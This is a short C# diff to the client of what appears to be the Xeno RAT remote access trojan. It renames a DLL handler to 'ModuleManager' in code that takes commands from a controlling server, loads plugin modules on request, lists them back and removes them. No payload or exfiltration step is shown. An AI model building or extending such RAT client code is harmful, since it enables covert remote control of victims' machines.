@@ -12,10 +12,10 @@ namespace xeno_rat_client
     class Handler
     {
         Node Main;
-        DllHandler dllhandler;
-        public Handler(Node _Main, DllHandler _dllhandler) 
+        ModuleManager ModuleManager;
+        public Handler(Node _Main, ModuleManager _ModuleManager) 
         {
-            dllhandler = _dllhandler;
+            ModuleManager = _ModuleManager;
             Main = _Main;
         }
         public async Task CreateSubSock(byte[] data)
@@ -153,7 +153,7 @@ namespace xeno_rat_client
                         await SendUpdateInfo(subServer);
                         break;
                     case 1:
-                        await dllhandler.DllNodeHandler(subServer);
+                        await ModuleManager.DllNodeHandler(subServer);
                         goto outofwhileloop;
                     case 2:
                         await setSetId(subServer,data);
@@ -176,14 +176,14 @@ namespace xeno_rat_client
             switch (opcode) 
             {
                 case 0:
-                    await subServer.SendAsync(Encoding.UTF8.GetBytes(String.Join("\n", dllhandler.Assemblies.Keys)));
+                    await subServer.SendAsync(Encoding.UTF8.GetBytes(String.Join("\n", ModuleManager.Assemblies.Keys)));
                     break;//get dlls
                 case 1:
                     string assm=Encoding.UTF8.GetString(data.Skip(2).ToArray());
                     bool worked = false;
-                    if (dllhandler.Assemblies.Keys.Contains(assm)) 
+                    if (ModuleManager.Assemblies.Keys.Contains(assm)) 
                     {
-                        worked=dllhandler.Assemblies.Remove(assm);
+                        worked=ModuleManager.Assemblies.Remove(assm);
                     }
 
                     await subServer.SendAsync(new byte[] { (byte)(worked ? 1 : 0) });
